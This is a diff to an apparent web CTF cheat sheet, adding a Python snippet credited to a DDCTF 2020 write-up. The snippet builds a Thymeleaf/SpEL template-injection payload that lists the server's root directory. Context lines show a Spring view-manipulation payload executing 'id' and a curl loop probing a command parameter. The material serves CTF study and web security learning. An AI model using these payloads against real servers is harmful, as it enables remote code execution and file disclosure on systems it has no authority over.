@@ -241,6 +241,12 @@ RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
     // Note: Only first word returned due to space splitting
     // Reference: https://github.com/veracode-research/spring-view-manipulation/
     GET /path?lang=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x HTTP/1.1
+
+    // https://l3yx.github.io/2020/09/04/DDCTF-2020-WEB-WriteUp/
+    def getClass(className):
+        return "T(com.ctf.model.User).getClassLoader().loadClass("+getString(className)+")"
+    poc = "${"+getClass("java.util.Arrays")+".toString("+getClass("java.nio.file.Files")+".list("+getClass("java.nio.file.Paths")+".get("+getString("/")+")).toArray()"+")}"
+    poc = "<input th:value="+poc+">"
     ```
 
 - https://github.com/w181496/Web-CTF-Cheatsheet#ssti
@@ -856,6 +862,10 @@ for n in {32..127}; do
     curl 'http://foo/' --data-raw 'cmd='"$c"'&submit=' | grep -E '(< HTTP)|error|success'
 done 2>/dev/null | vim -
 ```
+
+### case studies
+
+- [ModSecurity: Documentation](https://modsecurity.org/documentation.html)
 
 # wasm
 
